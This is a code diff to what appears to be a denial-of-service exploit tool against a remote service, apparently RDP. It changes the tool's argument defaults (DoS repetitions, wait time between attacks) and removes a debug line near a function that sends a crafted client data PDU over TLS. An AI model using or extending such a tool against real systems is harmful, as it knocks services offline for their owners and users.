@@ -24,16 +24,16 @@ class Parser(argparse.ArgumentParser):
             help="Pass the architecture of the target you are attacking (*default=64)"
         )
         parser.add_argument(
-            "-t", "--dos-times", type=int, dest="dosTime", default=60,
+            "-t", "--dos-times", type=int, dest="dosTime", default=60, metavar="AMOUNT",
             help="Pass how many times you want to DoS the target before exiting (*default=60)"
         )
         parser.add_argument(
-            "-w", "--wait-time", type=int, dest="waitTime", default=35,
-            help="Pass how long you want to wait in between DoS's (*default=35)"
+            "-w", "--wait-time", type=int, dest="waitTime", default=70, metavar="SECONDS",
+            help="Pass how long you want to wait in between DoS's (*default=70)"
         )
         parser.add_argument(
             "-v", "--verbose", action="store_true", default=False, dest="runVerbose",
-            help="Show the received packets"
+            help="Show the received packets (*default=False)"
         )
         return parser.parse_args()
 
@@ -176,7 +176,6 @@ def send_client_data_pdu_packet(tls, deletion_structure=(12, 109, 118, 132, 390)
     bin_differ[131] = size_differ_4[1]
     bin_differ[392] = size_differ_5[1]
     tls.sendall(bytes(bin_differ))
-    # print(repr(bin_differ));exit(1)
     results = tls.recv(8192)
     if verbose:
         print("[@] received: {}".format(repr(results)))
